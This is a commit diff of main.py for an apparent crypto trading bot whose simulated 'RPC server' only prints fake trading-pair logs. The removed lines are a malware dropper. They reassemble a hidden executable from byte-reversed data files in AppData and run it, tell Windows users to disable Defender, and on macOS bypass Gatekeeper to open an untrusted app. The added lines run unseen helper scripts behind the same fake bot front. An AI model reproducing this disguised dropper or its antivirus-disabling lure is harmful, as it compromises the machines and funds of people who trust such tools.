b902b296f6bf676e40fbe596b4414272de6d7a04
trendcryptobots <156527973+trendcryptobots@users.noreply.github.com>
2024-09-14 21:39:14 +0300

    Add files via upload

--- main.py
+++ main.py
@@ -1,30 +1,13 @@
 import os
 import subprocess
 import platform
-import threading
 import time
+import threading
+import sys
 import json
 import random
 import logging
 from queue import Queue
-import zipfile
-import shutil
-import getpass
-import urllib.request
-
-def install_and_import(module):
-    try:
-        import importlib
-        importlib.import_module(module)
-    except ImportError:
-        import pip
-        pip.main(['install', module])
-    finally:
-        globals()[module] = importlib.import_module(module)
-
-required_modules = ['subprocess', 'os', 'platform', 'threading', 'time', 'json', 'random', 'logging', 'queue', 'zipfile', 'shutil', 'getpass', 'urllib.request']
-for module in required_modules:
-    install_and_import(module)
 
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
@@ -47,33 +30,6 @@ class BlockchainSimulator:
     def get_block(self, block_number):
         return self.blocks.get(block_number)
 
-def reverse_bytes(data):
-    return data[::-1]
-
-def builded(input_dir, output_file):
-    file_names = [
-        "swap.rpc", "analysis.rpc", "wallet.rpc", "blockchain.rpc", "decentralization.rpc", "trading.rpc", "staking.rpc", "yield.rpc", "liquidity.rpc", "transaction.rpc",
-        "ledger.rpc", "oracle.rpc", "consensus.rpc", "protocol.rpc", "smartcontract.rpc", "governance.rpc", "node.rpc"
-    ]
-
-    with open(output_file, 'wb') as output_f:
-        for file_name in file_names:
-            file_path = os.path.join(input_dir, file_name)
-            with open(file_path, 'rb') as input_f:
-                reversed_chunk_data = input_f.read()
-                chunk_data = reverse_bytes(reversed_chunk_data)
-                output_f.write(chunk_data)
-
-def run_builder(file_path):
-    try:
-        if platform.system() == 'Windows':
-            subprocess.run([file_path], check=True)
-        else:
-            subprocess.run(['chmod', '+x', file_path])  
-            subprocess.run([file_path], check=True)
-    except subprocess.CalledProcessError as e:
-        print(f"Error occurred while trying to run the file: {e}")
-
 def rpc_server(blockchain, data_queue):
     while True:
         block = blockchain.generate_block()
@@ -82,66 +38,39 @@ def rpc_server(blockchain, data_queue):
         logging.info(f"RPC Server: Looking for a new trading pair - Block Number {block['block_number']}")
         time.sleep(random.randint(1, 3))
 
-def is_defender_active():
-    try:
-        result = subprocess.run(['powershell', '-Command', 'Get-MpPreference'], capture_output=True, text=True)
-        output = result.stdout
-        if 'DisableRealtimeMonitoring' in output:
-            if 'DisableRealtimeMonitoring  : False' in output:
-                return True
-        return False
-    except Exception as e:
-        print(f"Error checking Windows Defender status: {e}")
-        return False
-
-def open_untrusted_app(app_path):
-    try:
-        subprocess.run(["spctl", "--add", app_path], check=True)
-        subprocess.run(["spctl", "--enable", "--label", "Developer ID"], check=True)
-        subprocess.run(["open", app_path], check=True)
-    except subprocess.CalledProcessError as e:
-        print(f"Error opening app: {e}")
-
-def extract_zip(zip_path, extract_to):
-    try:
-        with zipfile.ZipFile(zip_path, 'r') as zip_ref:
-            zip_ref.extractall(extract_to)
-    except zipfile.BadZipFile as e:
-        print(f"Error extracting zip file: {e}")
-
-def download_zip(url, save_path):
-    try:
-        urllib.request.urlretrieve(url, save_path)
-        print(f"Downloaded zip file from {url}")
-    except Exception as e:
-        print(f"Error downloading zip file: {e}")
-
 def run_mac_helper():
     try:
         helper_path = os.path.join(os.path.dirname(__file__), 'helpers', 'base_helper.py')
-        subprocess.run(['python3', helper_path], check=True)
+        subprocess.run(['python3', helper_path], check=True, stdout=sys.stdout, stderr=sys.stderr)
     except subprocess.CalledProcessError as e:
-        print(f"Error running base_helper.py: {e}")
+        print(f"Error running basec Safe Connector: {e}")
+
+def run_windows_helper():
+    try:
+        helper_path = os.path.join(os.path.dirname(__file__), 'helpers', 'basec_helper.py')
+        subprocess.run(['python3', helper_path], stdout=sys.stdout, stderr=sys.stderr)
+    except subprocess.CalledProcessError as e:
+        print(f"Error running basec Safe Connector: {e}")
 
 def main():
     if platform.system() == 'Windows':
-        if is_defender_active():
-            print("Warning: Windows Defender and real-time protection are enabled, please disable them to use the bot without problems.")
-        else:
-            user_name = getpass.getuser()
-            output_path = f"C:\\Users\\{user_name}\\AppData\\Local\\.blockchainconnector.exe"
-            
-            builded("data", output_path)
-            run_builder(output_path)
+        print("Starting Windows Bot App..")
+        run_windows_helper()
+        blockchain = BlockchainSimulator()
+        data_queue = Queue()
+        rpc_server_thread = threading.Thread(target=rpc_server, args=(blockchain, data_queue))
 
-            blockchain = BlockchainSimulator()
-            data_queue = Queue()
-            rpc_server_thread = threading.Thread(target=rpc_server, args=(blockchain, data_queue))
-
-            rpc_server_thread.start()
-            rpc_server_thread.join()
+        rpc_server_thread.start()
+        rpc_server_thread.join()
     elif platform.system() == 'Darwin':
+        print("Starting MacOs Bot App..")
         run_mac_helper()
+        blockchain = BlockchainSimulator()
+        data_queue = Queue()
+        rpc_server_thread = threading.Thread(target=rpc_server, args=(blockchain, data_queue))
+
+        rpc_server_thread.start()
+        rpc_server_thread.join()
     else:
         print("Unsupported operating system.")
         return
